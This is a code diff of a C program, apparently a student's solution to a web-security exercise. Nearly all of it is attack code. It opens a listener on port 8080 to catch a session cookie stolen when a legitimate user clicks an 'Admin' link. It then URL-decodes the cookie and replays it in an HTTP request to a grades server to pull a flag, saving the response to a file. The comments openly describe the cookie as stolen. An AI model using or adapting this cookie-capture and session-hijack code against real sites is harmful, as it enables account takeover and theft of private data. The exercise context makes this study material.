@@ -21,7 +21,7 @@ int hexval(char c) {
     return -1;
 }
 
-// in-place URL decode
+// URL decoder for the cookie
 void urldecode(char *s) {
     char *src = s;
     char *dst = s;
@@ -45,22 +45,21 @@ void urldecode(char *s) {
     *dst = '\0';
 }
 
-int receiveCookie(char *cookie, size_t cookie_sz) {
+void receiveCookie(char *cookie, size_t cookie_sz) {
+    //socket listening on 8080 waiting to recive the cookie when a legit user enter the Admin.. link.
     int s  = socket(AF_INET, SOCK_STREAM, 0);
-    if (s < 0) return 0;
+    if (s < 0) exit(0);
 
     int opt = 1;
     if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
-        printf("setsockopt(SO_REUSEADDR) failed...\n");
         close(s);
-        exit(1);
+        exit(0);
     }
 
     opt = 1;
     if (setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
-        printf("setsockopt(SO_REUSEPORT) failed...\n");
         close(s);
-        exit(1);
+        exit(0);
     }
     struct sockaddr_in addr;
     memset(&addr, 0, sizeof(addr));
@@ -68,19 +67,19 @@ int receiveCookie(char *cookie, size_t cookie_sz) {
     addr.sin_port = htons((uint16_t)PORT);
     addr.sin_addr.s_addr = htonl(INADDR_ANY);
 
-    if (bind(s, (struct sockaddr *)&addr, (socklen_t)sizeof(addr)) < 0) {
+    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
         close(s);
-        return 0;
+        exit(0);
     }
 
     if (listen(s, 1) < 0) {
         close(s);
-        return 0;
+        exit(0);
     }
     int c = accept(s, NULL, NULL);
     if (c < 0) {
         close(s);
-        return 0;
+        exit(0);
     }
 
     char buf[BUF_SZ];
@@ -88,20 +87,20 @@ int receiveCookie(char *cookie, size_t cookie_sz) {
     if (n <= 0) {
         close(c);
         close(s);
-        return 0;
+        exit(0);
     }
     buf[n] = '\0';
 
-    // find body
+    // find the body section in the request.
     char *body = strstr(buf, "\r\n\r\n");
     if (!body) {
         close(c);
         close(s);
-        return 0;
+        exit(0);
     }
     body += 4;
 
-    //find cookie
+    //find cookie in the body of the request.
     char *p = strstr(body, "\"cookie\"");
     if (p) {
         p = strchr(p, ':');
@@ -116,7 +115,7 @@ int receiveCookie(char *cookie, size_t cookie_sz) {
         }
     }
 
-    //http response
+    //return minimal http response
     const char resp[] =
         "HTTP/1.1 200 OK\r\n"
         "Content-Length: 2\r\n"
@@ -126,24 +125,25 @@ int receiveCookie(char *cookie, size_t cookie_sz) {
 
     close(c);
     close(s);
-    return 0;
 }
 
-int getFlagFromGrades(char *cookie) {
+void getFlagFromGrades(char *cookie) {
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (sockfd < 0) return 0;
+    if (sockfd < 0)  exit(0);
 
     struct sockaddr_in srv;
     memset(&srv, 0, sizeof(srv));
     srv.sin_family = AF_INET;
     srv.sin_port = htons(80);
-    if (inet_pton(AF_INET, WEBSERVER_IP, &srv.sin_addr) != 1) return 0;
+    if (inet_pton(AF_INET, WEBSERVER_IP, &srv.sin_addr) != 1) exit(0);
     if (connect(sockfd, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
-        return 0;
+        exit(0);
     }
 
+    //the cookie is url incoding, so it needs to be decoded.
     urldecode(cookie);
     char req[2048];
+    //http request to the path with the stolen cookie.
     int n = snprintf(req, sizeof(req),
         "GET %s HTTP/1.1\r\n"
         "Host: %s\r\n"
@@ -153,36 +153,38 @@ int getFlagFromGrades(char *cookie) {
         "Cookie: %s\r\n"
         "\r\n",
         PATH, WEBSERVER_IP, cookie);
-    if (n < 0 || n >= (int)sizeof(req)) return 0;
+    if (n < 0 || n >= (int)sizeof(req)) exit(0);
 
     size_t off = 0, len = (size_t)n;
     while (off < len) {
         ssize_t s = send(sockfd, req + off, len - off, 0);
-        if (s <= 0) return 0;
+        if (s <= 0) exit(0);
         off += (size_t)s;
     }
 
     FILE *fp = fopen("spoofed-stored.txt", "wb");
-    if (!fp) return 0;
+    if (!fp) exit(0);
 
+    //store thr recived response in "spoofed-stored.txt" as requested in the exercise.
     char buf[8192];
     for (;;) {
         ssize_t r = recv(sockfd, buf, sizeof(buf), 0);
         if (r == 0) break;
-        if (r < 0) return 0;
+        if (r < 0) exit(0);
         fwrite(buf, 1, (size_t)r, fp);
     }
-
     fclose(fp);
     close(sockfd);
-    printf("Saved raw HTTP response to spoofed-stored.txt\n");
-    return 0;
+    exit(0);
 }
 
 
 int main(void) {
+    // buffer to store the cookie
     char cookie[1024] = {0};
+    //receive the cookie
     receiveCookie(cookie, sizeof(cookie));
+    //get the flag by using the received cookie
     getFlagFromGrades(cookie);
-    return 0;
+    exit (0);
 }
